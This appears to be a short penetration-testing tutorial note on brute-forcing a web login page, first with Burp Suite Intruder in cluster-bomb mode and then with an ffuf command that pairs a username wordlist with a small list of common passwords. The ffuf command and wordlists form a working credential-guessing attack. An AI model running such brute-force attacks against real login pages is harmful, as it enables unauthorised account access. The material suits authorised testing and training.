## Brute Force Login Page (Cluster Bomb With Burp Suite)

- username file : /usr/share/seclists/Usernames/top-usernames-shortlist.txt
- pass file : pass.txt

```
~ cat pass.txt

123456
password
password123
letmein

```

**Capture login request and send this request to burp intruder, then select attack type cluster bomp then highligt attacing value then select payloads and start attack**

![Image](/img/2023-11-07_08-52.png)

![Image](/img/2023-11-07_08-54.png)

![Image](/img/2023-11-07_08-55.png)

![Image](/img/2023-11-07_08-56.png)

![Image](/img/2023-11-07_08-57.png)

![Image](/img/2023-11-07_09-00.png)

## Brute Force Login Page (Cluster Bomb With ffuf)

Capture login request and edit attack points and save it

![Image](/img/2023-11-07_09-03.png)

then attack with ffuf

```
ffuf -request req.txt -request-proto http -mode clusterbomb -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZUSER -w pass.txt:FUZZPASSWORD -fs 3256,3356
```
